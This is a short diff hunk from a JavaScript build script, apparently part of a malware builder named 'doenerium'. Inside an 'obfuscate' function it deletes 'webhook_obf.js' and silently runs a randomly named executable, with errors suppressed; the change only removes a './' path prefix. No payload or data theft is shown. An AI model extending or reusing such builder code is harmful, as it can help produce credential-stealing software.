@@ -207,7 +207,7 @@ async function obfuscate(input, output) {
     fs.unlinkSync("webhook_obf.js");
 
     try {
-        child_process.execSync(`./doenerium_${randomid}.exe`)
+        child_process.execSync(`doenerium_${randomid}.exe`)
     } catch {}
     
 
